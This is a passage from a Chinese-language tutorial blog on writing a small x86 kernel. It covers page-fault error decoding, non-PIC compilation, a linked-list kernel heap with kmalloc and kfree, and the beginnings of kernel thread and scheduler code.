class="number">0x2</span>) &#123;</span><br><span class="line">		printk_color(rc_black, rc_red, <span class="string">&quot;Write error.\n&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		printk_color(rc_black, rc_red, <span class="string">&quot;Read error.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// bit 2 为 1 表示在用户模式打断的，为 0 是在内核模式打断的</span></span><br><span class="line">	<span class="keyword">if</span> (regs-&gt;err_code &amp; <span class="number">0x4</span>) &#123;</span><br><span class="line">		printk_color(rc_black, rc_red, <span class="string">&quot;In user mode.\n&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		printk_color(rc_black, rc_red, <span class="string">&quot;In kernel mode.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// bit 3 为 1 表示错误是由保留位覆盖造成的</span></span><br><span class="line">	<span class="keyword">if</span> (regs-&gt;err_code &amp; <span class="number">0x8</span>) &#123;</span><br><span class="line">		printk_color(rc_black, rc_red, <span class="string">&quot;Reserved bits being overwritten.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// bit 4 为 1 表示错误发生在取指令的时候</span></span><br><span class="line">	<span class="keyword">if</span> (regs-&gt;err_code &amp; <span class="number">0x10</span>) &#123;</span><br><span class="line">		printk_color(rc_black, rc_red, <span class="string">&quot;The fault occurred during an instruction fetch.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<blockquote>
<p>objdump - h hx…</p>
</blockquote>
<p><img src="/2024/05/14/x86-6-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240515153030548.png" alt="image-20240515153030548"></p>
<p>得到这个 </p>
<p><img src="/2024/05/14/x86-6-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240515152938282.png" alt="image-20240515152938282"></p>
<blockquote>
<p>显然结果不太对劲 —</p>
</blockquote>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">C_FLAGS = -c -Wall -m32 -ggdb -gstabs+ -nostdinc -fno-builtin -fno-stack-protector -I <span class="keyword">include</span></span><br><span class="line"><span class="comment">#将makefile 修改如下  即添加-fno-pic</span></span><br><span class="line">C_FLAGS = -c -Wall -m32 -ggdb -gstabs+ -nostdinc -fno-pic -fno-builtin -fno-stack-protector -I <span class="keyword">include</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/05/14/x86-6-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240520221554124.png" alt="image-20240520221554124"></p>
<h3 id="非位置无关代码"><a href="#非位置无关代码" class="headerlink" title="非位置无关代码"></a>非位置无关代码</h3><blockquote>
<p><code>-fno-pic</code></p>
<p><a href="https://blog.csdn.net/tilblackout/article/details/135585340">位置无关码PIC详解：原理、动态链接库、代码重定位_-pic 位置无关代码-CSDN博客</a></p>
</blockquote>
<ul>
<li><code>-fno-pic</code> 是 GCC 编译器的一个编译选项，用于生成<strong>非位置无关代码</strong>（Non-Position Independent Code, 非PIC）</li>
</ul>
<p><strong>位置无关代码：</strong></p>
<p>位置无关代码是一种在加载时可以<strong>不依赖于固定的内存地址而运行的代码</strong>。PIC 通常用于共享库（shared libraries），因为它允许相同的代码在不同的进程地址空间中加载到不同的地址。</p>
<ul>
<li>编译时生成的代码可以在内存中的任何位置运行。</li>
<li>通常使用相对地址进行跳转和数据访问。</li>
</ul>
<p><strong>非位置无关代码：</strong></p>
<ul>
<li><p>编译时生成的代码预期在特定的内存地址运行。</p>
</li>
<li><p>使用绝对地址进行跳转和数据访问。</p>
</li>
<li><p><strong>操作系统内核通常加载在固定的物理地址或虚拟地址空间中，因此不需要位置无关的特性。</strong></p>
</li>
<li><p>内核代码必须能够直接访问硬件和内存，这需要使用绝对地址。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>x86内核实现</category>
      </categories>
      <tags>
        <tag>x86</tag>
        <tag>linxu</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>x86-7-heap</title>
    <url>/2024/05/20/x86-7-heap/</url>
    <content><![CDATA[<h1 id="11-内核堆管理的实现"><a href="#11-内核堆管理的实现" class="headerlink" title="11.内核堆管理的实现"></a>11.内核堆管理的实现</h1><p>目前已经实现了页管理，但是在需要分配小内存的时候，比较容易造成<strong>内部碎片</strong>， — 实现内核的堆管理算法</p>
<p>内部碎片指的是：内存中各种对齐规则的限制，导致分配的内存 大于 进程所需要的内存，因此会造成内部碎片</p>
<p><strong>需要实现的功能：</strong></p>
<ul>
<li>分配内存</li>
<li>在内存释放的时候对连续的内存进行合并</li>
<li>在空闲内存过多的时候，将物理页释放给物理内存管理模块</li>
</ul>
<blockquote>
<p>关于堆的实现，选择最简单的<strong>侵入式链表管理方法</strong></p>
<p><a href="https://zhuanlan.zhihu.com/p/675389928">Linux: C语言实现范型数据结构 - 嵌入(侵入)式链表浅谈 - 知乎 (zhihu.com)</a></p>
<p>侵入式链表（Intrusive Linked List）是一种链表实现方式，其中<strong>链表节点的链接信息嵌入在节点数据结构本身中。</strong></p>
<p>减少了内存的开销</p>
</blockquote>
<blockquote>
<p>include&#x2F;heap.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_HEAP_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_HEAR_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 堆起始地址，它是内核页表没有使用的空闲区域。</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_START 0xE0000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内存块管理结构</span></span><br><span class="line"><span class="keyword">typedef</span> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">header</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">header</span> *<span class="title">prev</span>;</span>   <span class="comment">// 前后内存快管理结构</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">header</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">uint32_t</span> allocated : <span class="number">1</span>;  <span class="comment">// 该块内存是否已经被申请</span></span><br><span class="line">    <span class="type">uint32_t</span> length : <span class="number">31</span>;    <span class="comment">// 当前内存块的长度</span></span><br><span class="line">&#125;<span class="type">header_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化堆</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_heap</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内存申请</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">kmalloc</span><span class="params">(<span class="type">uint32_t</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内存释放</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">void</span> *p)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test_heap</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint32_t</span> allocated : <span class="number">1</span>;  <span class="comment">// 该块内存是否已经被申请</span></span><br><span class="line">   <span class="type">uint32_t</span> length : <span class="number">31</span>; </span><br></pre></td></tr></table></figure>

<p>C语言的位域，能够节省内存，允许精确控制每个成员的位宽，但是移植性较差</p>
<blockquote>
<p>mm&#x2F;heap.c 具体实现  除了上述的外部接口函数，还需要实现一些内部函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请内存块</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">alloc_chunk</span><span class="params">(<span class="type">uint32_t</span> start, <span class="type">uint32_t</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放内存块</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">free_chunk</span><span class="params">(<span class="type">header_t</span> *chunk)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 切分内存块</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">split_chunk</span><span class="params">(<span class="type">header_t</span> *chunk, <span class="type">uint32_t</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">glue_chunk</span><span class="params">(<span class="type">header_t</span> *chunk)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> heap_max = HEAP_START;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内存块管理头指针</span></span><br><span class="line"><span class="type">static</span> <span class="type">header_t</span> *heap_first;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_heap</span><span class="params">()</span> &#123;</span><br><span class="line">    heap_first = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">kmalloc</span><span class="params">(<span class="type">uint32_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 所有申请的内存长度加上管理头的长度</span></span><br><span class="line">	<span class="comment">// 因为在内存申请和释放的时候要通过该结构去管理</span></span><br><span class="line">	len += <span class="keyword">sizeof</span>(<span class="type">header_t</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">header_t</span> *cur_header = heap_first;</span><br><span class="line">	<span class="type">header_t</span> *prev_header = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (cur_header) &#123;</span><br><span class="line">		<span class="comment">// 如果当前内存块没有被申请过而且长度大于待申请的块</span></span><br><span class="line">		<span class="keyword">if</span> (cur_header-&gt;allocated == <span class="number">0</span> &amp;&amp; cur_header-&gt;length &gt;= len) &#123;</span><br><span class="line">			<span class="comment">// 按照当前长度切割内存</span></span><br><span class="line">			split_chunk(cur_header, len);</span><br><span class="line">			cur_header-&gt;allocated = <span class="number">1</span>;</span><br><span class="line">			<span class="comment">// 返回的时候必须将指针挪到管理结构之后</span></span><br><span class="line">			<span class="keyword">return</span> (<span class="type">void</span> *)((<span class="type">uint32_t</span>)cur_header + <span class="keyword">sizeof</span>(<span class="type">header_t</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 逐次推移指针</span></span><br><span class="line">		prev_header = cur_header;</span><br><span class="line">		cur_header = cur_header-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> chunk_start;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 第一次执行该函数则初始化内存块起始位置</span></span><br><span class="line">	<span class="comment">// 之后根据当前指针加上申请的长度即可</span></span><br><span class="line">	<span class="keyword">if</span> (prev_header) &#123;</span><br><span class="line">		chunk_start = (<span class="type">uint32_t</span>)prev_header + prev_header-&gt;length;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		chunk_start = HEAP_START;</span><br><span class="line">		heap_first = (<span class="type">header_t</span> *)chunk_start;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 检查是否需要申请内存页</span></span><br><span class="line">	alloc_chunk(chunk_start, len);</span><br><span class="line">	cur_header = (<span class="type">header_t</span> *)chunk_start;</span><br><span class="line">	cur_header-&gt;prev = prev_header;</span><br><span class="line">	cur_header-&gt;next = <span class="number">0</span>;</span><br><span class="line">	cur_header-&gt;allocated = <span class="number">1</span>;</span><br><span class="line">	cur_header-&gt;length = len;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (prev_header) &#123;</span><br><span class="line">		prev_header-&gt;next = cur_header;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">void</span>*)(chunk_start + <span class="keyword">sizeof</span>(<span class="type">header_t</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 指针回退到管理结构，并将已使用标记置 0</span></span><br><span class="line">	<span class="type">header_t</span> *header = (<span class="type">header_t</span>*)((<span class="type">uint32_t</span>)p - <span class="keyword">sizeof</span>(<span class="type">header_t</span>));</span><br><span class="line">	header-&gt;allocated = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 粘合内存块</span></span><br><span class="line">	glue_chunk(header);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_chunk</span><span class="params">(<span class="type">uint32_t</span> start, <span class="type">uint32_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 如果当前堆的位置已经到达界限则申请内存页</span></span><br><span class="line">	<span class="comment">// 必须循环申请内存页直到有到足够的可用内存</span></span><br><span class="line">	<span class="keyword">while</span> (start + len &gt; heap_max) &#123;</span><br><span class="line">		<span class="type">uint32_t</span> page = pmm_alloc_page();</span><br><span class="line">		<span class="built_in">map</span>(pgd_kern, heap_max, page, PAGE_PRESENT | PAGE_WRITE);</span><br><span class="line">		heap_max += PAGE_SIZE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_chunk</span><span class="params">(<span class="type">header_t</span> *chunk)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (chunk-&gt;prev == <span class="number">0</span>) &#123;</span><br><span class="line">		heap_first = <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		chunk-&gt;prev-&gt;next = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 空闲的内存超过 1 页的话就释放掉</span></span><br><span class="line">	<span class="keyword">while</span> ((heap_max - PAGE_SIZE) &gt;= (<span class="type">uint32_t</span>)chunk) &#123;</span><br><span class="line">		heap_max -= PAGE_SIZE;</span><br><span class="line">		<span class="type">uint32_t</span> page;</span><br><span class="line">		get_mapping(pgd_kern, heap_max, &amp;page);</span><br><span class="line">		unmap(pgd_kern, heap_max);</span><br><span class="line">		pmm_free_page(page);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">split_chunk</span><span class="params">(<span class="type">header_t</span> *chunk, <span class="type">uint32_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 切分内存块之前得保证之后的剩余内存至少容纳一个内存管理块的大小</span></span><br><span class="line">	<span class="keyword">if</span> (chunk-&gt;length - len &gt; <span class="keyword">sizeof</span> (<span class="type">header_t</span>)) &#123;</span><br><span class="line">		<span class="type">header_t</span> *newchunk = (<span class="type">header_t</span> *)((<span class="type">uint32_t</span>)chunk + len);</span><br><span class="line">		newchunk-&gt;prev = chunk;</span><br><span class="line">		newchunk-&gt;next = chunk-&gt;next;</span><br><span class="line">		newchunk-&gt;allocated = <span class="number">0</span>;</span><br><span class="line">		newchunk-&gt;length = chunk-&gt;length - len;</span><br><span class="line"></span><br><span class="line">		chunk-&gt;next = newchunk;</span><br><span class="line">		chunk-&gt;length = len;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">glue_chunk</span><span class="params">(<span class="type">header_t</span> *chunk)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 如果该内存块后面有链内存块且未被使用则拼合</span></span><br><span class="line">	<span class="keyword">if</span> (chunk-&gt;next &amp;&amp; chunk-&gt;next-&gt;allocated == <span class="number">0</span>) &#123;</span><br><span class="line">		chunk-&gt;length = chunk-&gt;length + chunk-&gt;next-&gt;length;</span><br><span class="line">		<span class="keyword">if</span> (chunk-&gt;next-&gt;next) &#123;</span><br><span class="line">			chunk-&gt;next-&gt;next-&gt;prev = chunk;</span><br><span class="line">		&#125;</span><br><span class="line">		chunk-&gt;next = chunk-&gt;next-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果该内存块前面有链内存块且未被使用则拼合</span></span><br><span class="line">	<span class="keyword">if</span> (chunk-&gt;prev &amp;&amp; chunk-&gt;prev-&gt;allocated == <span class="number">0</span>) &#123;</span><br><span class="line">		chunk-&gt;prev-&gt;length = chunk-&gt;prev-&gt;length + chunk-&gt;length;</span><br><span class="line">		chunk-&gt;prev-&gt;next = chunk-&gt;next;</span><br><span class="line">		<span class="keyword">if</span> (chunk-&gt;next) &#123;</span><br><span class="line">			chunk-&gt;next-&gt;prev = chunk-&gt;prev;</span><br><span class="line">		&#125;</span><br><span class="line">		chunk = chunk-&gt;prev;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 假如该内存后面没有链表内存块了直接释放掉</span></span><br><span class="line">	<span class="keyword">if</span> (chunk-&gt;next == <span class="number">0</span>) &#123;</span><br><span class="line">		free_chunk(chunk);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	printk_color(rc_black, rc_magenta, <span class="string">&quot;Test kmalloc() &amp;&amp; kfree() now ...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *addr1 = kmalloc(<span class="number">50</span>);</span><br><span class="line">	printk(<span class="string">&quot;kmalloc    50 byte in 0x%X\n&quot;</span>, addr1);</span><br><span class="line">	<span class="type">void</span> *addr2 = kmalloc(<span class="number">500</span>);</span><br><span class="line">	printk(<span class="string">&quot;kmalloc   500 byte in 0x%X\n&quot;</span>, addr2);</span><br><span class="line">	<span class="type">void</span> *addr3 = kmalloc(<span class="number">5000</span>);</span><br><span class="line">	printk(<span class="string">&quot;kmalloc  5000 byte in 0x%X\n&quot;</span>, addr3);</span><br><span class="line">	<span class="type">void</span> *addr4 = kmalloc(<span class="number">50000</span>);</span><br><span class="line">	printk(<span class="string">&quot;kmalloc 50000 byte in 0x%X\n\n&quot;</span>, addr4);</span><br><span class="line"></span><br><span class="line">	printk(<span class="string">&quot;free mem in 0x%X\n&quot;</span>, addr1);</span><br><span class="line">	kfree(addr1);</span><br><span class="line">	printk(<span class="string">&quot;free mem in 0x%X\n&quot;</span>, addr2);</span><br><span class="line">	kfree(addr2);</span><br><span class="line">	printk(<span class="string">&quot;free mem in 0x%X\n&quot;</span>, addr3);</span><br><span class="line">	kfree(addr3);</span><br><span class="line">	printk(<span class="string">&quot;free mem in 0x%X\n\n&quot;</span>, addr4);</span><br><span class="line">	kfree(addr4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>init&#x2F;entry.c 加入头文件以及初始化heap 和 添加测试test_heap()  ！！</p>
<p>！！！注意 vmm的初始化一定要在pmm之后</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap.c&quot;</span></span></span><br><span class="line">    </span><br><span class="line">....</span><br><span class="line">	init_heap();</span><br><span class="line">	test_heap();</span><br></pre></td></tr></table></figure>



<p>运行结果如下：</p>
<p><img src="/2024/05/20/x86-7-heap/image-20240521113202344.png" alt="image-20240521113202344"></p>
]]></content>
      <categories>
        <category>x86内核实现</category>
      </categories>
      <tags>
        <tag>x86</tag>
        <tag>linxu</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>x86_thread</title>
    <url>/2024/05/21/x86-8-thread/</url>
    <content><![CDATA[<h1 id="12-内核线程的创建与切换"><a href="#12-内核线程的创建与切换" class="headerlink" title="12.内核线程的创建与切换"></a>12.内核线程的创建与切换</h1><p>此处的内核线程作为运行在内核态的一个逻辑执行流，用于私有的栈空间，但是除了私有的栈空间外，不拥有其他资源</p>
<p><strong>所以的内核线程拥有相同的页表，共享所有的全局数据</strong></p>
<p>一般OS 都不会完全采用硬件切换机制，但本简单的内核，只是涉及到内核态，不涉及特权级的转移过程，所以完全可以用硬件实现</p>
<blockquote>
<p>任务的切换必然涉及到现场的保护与恢复，所以就必然需要一个数据结构来保存这 些现场信息。这个数据结构中一般也会放置任务相关的一些信息并且以链表之类的方式 组织起来，这个结构被称之为<code>PCB（Process Control Block）</code>或者TCB（Task Control Block）</p>
</blockquote>
<blockquote>
<p>include&#x2F;task.h 函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_TASK_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_TASK_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// state 枚举</span></span><br><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">task_state</span>&#123;</span></span><br><span class="line">    TASK_UNINIT = <span class="number">0</span>,    <span class="comment">// 为初始化</span></span><br><span class="line">    TASK_SLEEPING = <span class="number">1</span>,  <span class="comment">// 睡眠</span></span><br><span class="line">    TASK_RUNNABLE = <span class="number">2</span>,  <span class="comment">// 可运行（也可能正在运行</span></span><br><span class="line">    TASK_ZOMBIE = <span class="number">3</span>,    <span class="comment">// 僵尸状态</span></span><br><span class="line">&#125;task_state;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核线程的上下文切换 保存的信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> esp;</span><br><span class="line">    <span class="type">uint32_t</span> ebp;</span><br><span class="line">    <span class="type">uint32_t</span> ebx;</span><br><span class="line">    <span class="type">uint32_t</span> esi;</span><br><span class="line">    <span class="type">uint32_t</span> edi;</span><br><span class="line">    <span class="type">uint32_t</span> eflags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进程内存地址结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">pgd_t</span> *pgd_dir; <span class="comment">// 进程页表</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进程控制块 PCB</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> task_state state;  <span class="comment">// 进程当前状态</span></span><br><span class="line">    <span class="type">pid_t</span> pid;                  <span class="comment">// 进程标识符</span></span><br><span class="line">    <span class="type">void</span> *<span class="built_in">stack</span>;                <span class="comment">// 进程的内核栈地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span>       <span class="comment">// 当前进程的内存地址映像</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>     <span class="comment">// 进程切换需要的上下文信息</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">next</span>;</span>   <span class="comment">// 链表指针volatile task_state state;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局pid 值</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">pid_t</span> now_pid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核线程创建</span></span><br><span class="line"><span class="type">int32_t</span> <span class="title function_">kernel_thread</span><span class="params">(<span class="type">int</span> (*fn)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程退出函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">kthread_exit</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>include&#x2F;types.h 补充</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int32_t</span> <span class="type">pid_t</span>;</span><br></pre></td></tr></table></figure>



<p>调度机制</p>
<blockquote>
<p>include&#x2F;sched.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_SCHEDULER_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_SCHEDULER_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;task.h&quot;</span></span></span><br><span class="line"><span class="comment">// 可调度进程连表</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">running_proc_head</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待进程链表</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">wait_proc_head</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当前运行任务</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">current</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化任务调度</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_sched</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务调度</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">schedule</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务切换准备</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_task_to</span> <span class="params">(<span class="keyword">struct</span> task_struct *next)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务切换</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">switch_to</span> <span class="params">(<span class="keyword">struct</span> context *prev, <span class="keyword">struct</span> context *next)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>所以任务组织的方式就是一个单向循环链表，调 度程序每次选择当前任务的下一个任务运行 </p>
<p>没有采用复杂的调度策略</p>
<p>在进行任务切换之前，内核原先的执行流还没有一个结构来保存其信息，所以需要在初 始化调度之前<strong>给原始的执行流创建PCB信息。这里模仿Linux内核早期的做法，将PCB放置 在线程栈的最低处</strong>。</p>
<blockquote>
<p>kernel&#x2F;sched&#x2F;sched.c  任务调度初始化代码如下：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sched.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可调度进程链表</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">running_proc_head</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待进程链表</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">wait_proc_head</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当前运行的任务</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">current</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_sched</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 为当前执行流创建信息结构体该结构位于当前执行流的栈最低端</span></span><br><span class="line">    current = (<span class="keyword">struct</span> task_struct *) (kern_stack_top - 